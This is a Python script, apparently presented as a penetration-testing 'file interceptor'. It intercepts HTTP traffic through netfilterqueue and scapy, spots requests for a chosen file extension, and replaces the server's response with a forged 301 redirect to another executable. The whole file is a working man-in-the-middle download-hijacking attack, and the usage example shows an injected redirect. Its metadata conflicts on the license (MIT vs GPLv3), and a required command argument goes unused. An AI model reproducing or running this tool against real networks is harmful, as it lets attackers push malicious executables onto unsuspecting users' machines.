#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import argparse

"""
    Run the script by providing the required arguments in the following format:
    
    Usage:
      ./python script.py -c command -p 8080 -f '.exe' -i '192.168.100.210' \
            -r 'HTTP/1.1 301 Moved Permanently\nLocation: https://the.earth.li/~sgtatham/putty/0.63/x86/psftp.exe\n\n'
      
   A file interceptor Python script written to intercept file requests over a network. 
   It can modify or replace the requested files in transit, often used for penetration 
   testing or ethical hacking scenarios to assess system vulnerabilities.
    
    License:
        MIT License

        Copyright (c) 2023, WildBerry, LLC

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contacts__    = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__copyright__   = "Copyright 2023, WildBerry, LLC"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__emails__      = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet, select_port, file_ext, ip_address, redirect_url):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == select_port:
                print('[+] packet destination found : ' + str(select_port))
                if file_ext in str(scapy_packet[scapy.Raw].load) and ip_address not in str(scapy_packet[scapy.Raw].load):
                    print(f'[+] {file_ext} Request.')
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())

            elif scapy_packet[scapy.TCP].sport == select_port:
                print('[+] packet source found : ' + str(select_port))
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print('[+] Replacing file')
                    modified_packet = set_load(scapy_packet, redirect_url)
                    packet.set_payload(bytes(modified_packet))
        except IndexError:
            print("[+] Layer [TCP] not found!\n", end='')

    packet.accept()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Redirect downloads to another file")
    parser.add_argument("-c", "--command", dest="command",
                        help="Command to execute", required=True)
    parser.add_argument("-p", "--select-port", dest="select_port",
                        help="Select port", type=int, required=True)
    parser.add_argument("-f", "--file-ext", dest="file_ext",
                        help="File extension", required=True)
    parser.add_argument("-i", "--ip-address", dest="ip_address",
                        help="IP Address", required=True)
    parser.add_argument("-r", "--redirect-url", dest="redirect_url",
                        help="Redirect URL", required=True)

    args = parser.parse_args()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(
        packet, args.select_port, args.file_ext, args.ip_address, args.redirect_url))
    queue.run()
